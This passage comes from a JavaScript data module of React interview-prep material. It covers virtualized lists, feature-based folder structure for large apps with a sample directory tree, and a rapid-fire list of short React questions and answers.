        "Trap: 'Why does my virtual list jump while scrolling?' Usually wrong height estimates for variable-height rows. Measure rows (`measureElement` in TanStack Virtual) or use fixed heights.",
      ],
      takeaway: "Virtualize the DOM, paginate the data with cursors; together they keep huge lists fast.",
    },

    {
      id: 'folder-structure',
      title: 'Folder structure for large React apps',
      level: 'intermediate',
      priority: 'good',
      frequency: 'common',
      summary: 'Group code by feature, keep shared code small and generic, and expose each feature through a public entry point.',
      what: [
        "Small apps can use type-based folders: `components/`, `hooks/`, `pages/`. As the app grows, a change to one feature touches five folders, and nobody knows what is safe to delete.",
        "Large apps usually group by **feature** (or domain): `features/jobs/` holds the jobs components, hooks, API calls, types and tests together. Truly shared, generic pieces (a Button, a `useDebounce`) live in `shared/` or `components/ui/`.",
      ],
      deeper: [
        "Rules that keep it clean: features may import from `shared`, but `shared` never imports from features. Features talk to each other through each feature's `index.ts` (its public API), not deep imports into another feature's internals. ESLint import rules can enforce this.",
        "Co-locate: tests, styles and stories next to the component they belong to. Keep API calls in a feature's `api/` file wrapped by TanStack Query hooks, so components never call `fetch` directly.",
        "Popular references: Bulletproof React and Feature-Sliced Design. In Next.js App Router, the `app/` folder is for routes, and feature code still lives in `features/` or similar, imported by thin route files.",
        "Don't over-engineer: start simple and split when a folder becomes painful. Consistency matters more than the exact layout.",
      ],
      why: "Interviewers want to see that you can keep a codebase navigable as the team and features grow, and that you think about boundaries and ownership.",
      analogy: "A supermarket arranged by aisle (feature: bakery, dairy) instead of by material (everything in plastic in one aisle, everything in glass in another). You find what you need for one recipe in one place.",
      code: {
        lang: 'text',
        source: `src/
  app/                    # app shell: providers, router, global styles
    providers.tsx         # QueryClientProvider, AuthProvider, ThemeProvider
    router.tsx
  features/
    auth/
      api/                # login(), refresh(), logout() + useLogin() hooks
      components/LoginForm.tsx
      hooks/useAuth.ts
      index.ts            # public API: export { LoginForm, useAuth }
    jobs/
      api/jobs.api.ts     # fetchJobs(), closeJob()
      api/jobs.queries.ts # useJobs(), useCloseJob() (TanStack Query)
      components/JobList.tsx
      components/JobList.test.tsx
      types.ts
      index.ts
    candidates/
      ...
  shared/
    components/ui/        # Button, Modal, Table: no business logic
    hooks/                # useDebounce, useMediaQuery
    lib/http.ts           # fetch wrapper: credentials, 401 -> refresh -> retry
    utils/
  pages/ (or routes/)     # thin: compose features per URL

Rules:
  features/* -> may import shared/*
  shared/*   -> never imports features/*
  features/a -> imports features/b only via 'features/b' (its index.ts)`,
      },
      output: "A developer working on jobs opens one folder and finds the UI, data hooks, API calls, types and tests together. Removing the candidates feature means deleting one folder and fixing the few imports of its index.ts. Shared UI stays generic, so it can be reused or moved into a design-system package later.",
      questions: [
        { q: "How would you structure a large React app?", a: "By feature: each feature folder holds its components, hooks, API calls, types and tests, with an index file as its public API. Generic, reusable pieces go in a shared folder that never imports from features." },
        { q: "Feature-based vs type-based folders?", a: "Type-based (components, hooks, services) is fine for small apps. Feature-based scales better because related code changes together and lives together, making ownership and deletion easy." },
        { q: "Where do API calls go?", a: "In a feature's api module, wrapped in data hooks like useJobs built on TanStack Query, so components don't call fetch directly and caching is consistent. A shared HTTP client handles auth headers, credentials and token refresh." },
        { q: "How do you stop features from depending on each other's internals?", a: "Expose only what's needed through each feature's index file and enforce import boundaries with ESLint rules or path aliases." },
      ],
      answer30: "For a large app I group by feature: features/jobs has its components, data hooks, API calls, types and tests together, with an index file as its public API. Generic UI and helpers go in shared, which never imports from features. Pages or routes stay thin and just compose features. API calls go through a shared HTTP client, for example one that handles the 401-refresh-retry flow, wrapped in TanStack Query hooks. I'd enforce boundaries with lint rules and start simple, splitting when a folder starts hurting.",
      mistakes: [
        "A giant `components/` folder with 200 files and no grouping.",
        "Shared code importing feature code, creating circular dependencies.",
        "Deep imports into another feature's internals.",
        "Trap: 'Is there one correct structure?' No. Explain the principles (co-location, boundaries, public APIs) rather than defending one exact tree.",
      ],
      takeaway: "Group by feature, keep shared generic, cross features only through public entry points.",
    },
  ],

  rapidFire: [
    { q: 'What is JSX compiled to?', a: 'JavaScript function calls that create React elements (plain objects).' },
    { q: 'Are props mutable?', a: 'No, props are read-only.' },
    { q: 'Why does state not update immediately?', a: 'Each render has a snapshot; the setter schedules a new render.' },
    { q: 'When to use setX(prev => ...)?', a: 'When the next value depends on the previous one.' },
    { q: 'What is batching?', a: 'React groups multiple state updates into one re-render. Since React 18 this also happens in timeouts, promises, and native events.' },
    { q: 'Why keys in lists?', a: 'To match items between renders and keep state with the right item.' },
    { q: 'Is index as key okay?', a: 'Only for static lists that never reorder or insert.' },
    { q: 'useEffect with [] runs when?', a: 'After the first render (twice in development with StrictMode).' },
    { q: 'When does effect cleanup run?', a: 'Before the effect re-runs and on unmount.' },
    { q: 'How to avoid fetch race conditions in useEffect?', a: 'AbortController in the cleanup, or an ignore flag.' },
    { q: 'useEffect vs useLayoutEffect?', a: 'useEffect runs after paint; useLayoutEffect runs before paint, for measuring layout.' },
    { q: 'What is prop drilling?', a: 'Passing props through components that don\'t need them to reach a deep child.' },
    { q: 'Why do all context consumers re-render?', a: 'The provider value changed, often because a new object is created each render.' },
    { q: 'Do custom hooks share state?', a: 'No, they share logic. Each call has its own state.' },
    { q: 'Rule of hooks?', a: 'Only call hooks at the top level of components or hooks, never in conditions or loops.' },
    { q: 'useMemo vs useCallback?', a: 'useMemo caches a value; useCallback caches a function.' },
    { q: 'What comparison does React.memo use?', a: 'Shallow, per prop, with Object.is.' },
    { q: 'Three causes of a re-render?', a: 'Own state change, parent re-render, consumed context change.' },
    { q: 'What happens when element type changes?', a: 'React destroys the old subtree and builds a new one, losing state.' },
    { q: 'What is Fiber?', a: 'React\'s reconciler that splits rendering into interruptible units of work.' },
    { q: 'Does changing ref.current re-render?', a: 'No. Refs persist across renders silently; use state for anything shown on screen.' },
    { q: 'useReducer vs useState?', a: 'useReducer for related fields or many update paths; useState for simple independent values.' },
    { q: 'Is dispatch stable?', a: 'Yes, its identity never changes, so it needs no useCallback.' },
    { q: 'Controlled vs uncontrolled input?', a: 'Controlled: state owns the value. Uncontrolled: the DOM owns it; read via ref or FormData.' },
    { q: 'What is a stale closure?', a: 'A function from an old render reading that render\'s old state or props.' },
    { q: 'What do error boundaries not catch?', a: 'Event handler errors, async errors, SSR errors, and errors in the boundary itself.' },
    { q: 'Can error boundaries be function components?', a: 'No, they still need a class (or the react-error-boundary package).' },
    { q: 'Where should lazy() be called?', a: 'At module top level, never inside a component.' },
    { q: 'Do React events bubble out of a portal?', a: 'Yes, through the React tree, even though the DOM is elsewhere.' },
    { q: 'useTransition vs useDeferredValue?', a: 'useTransition wraps a state update; useDeferredValue wraps a value you receive.' },
    { q: 'How to opt out of automatic batching?', a: 'flushSync from react-dom.' },
    { q: 'What does useActionState return?', a: '[state, formAction, isPending].' },
    { q: 'What does useOptimistic do?', a: 'Shows the expected result during an async action and reverts automatically if it fails.' },
    { q: 'What is special about use()?', a: 'It reads a promise or context and can be called conditionally.' },
    { q: 'Is forwardRef needed in React 19?', a: 'No, function components receive ref as a prop; forwardRef still works but is slated for deprecation.' },
    { q: 'Is the React Compiler stable?', a: 'Yes, v1.0 shipped in October 2025 as a separate build plugin that auto-memoizes.' },
    { q: 'Which Fiber phase is interruptible?', a: 'Render. Commit is synchronous and all-or-nothing.' },
    { q: 'Top causes of hydration mismatch?', a: 'Dates, random values, window/localStorage reads in render, and invalid HTML nesting.' },
    { q: 'Does StrictMode affect production?', a: 'No, its double renders and effect re-runs are development-only.' },
    { q: 'What does Outlet do?', a: 'Renders the matched child route inside a parent layout route.' },
    { q: 'staleTime vs gcTime in TanStack Query?', a: 'staleTime: how long data is fresh (default 0). gcTime: how long unused data stays cached (default 5 min).' },
    { q: 'getBy vs queryBy vs findBy?', a: 'getBy throws, queryBy returns null (for absence), findBy waits (async).' },
    { q: 'When is dangerouslySetInnerHTML safe?', a: 'Only with trusted or sanitized HTML, for example via DOMPurify.' },
    { q: 'Virtualization vs infinite scroll?', a: 'Virtualization limits DOM nodes; infinite scroll limits data loaded. Use both for huge lists.' },
  ],
};

export default react;
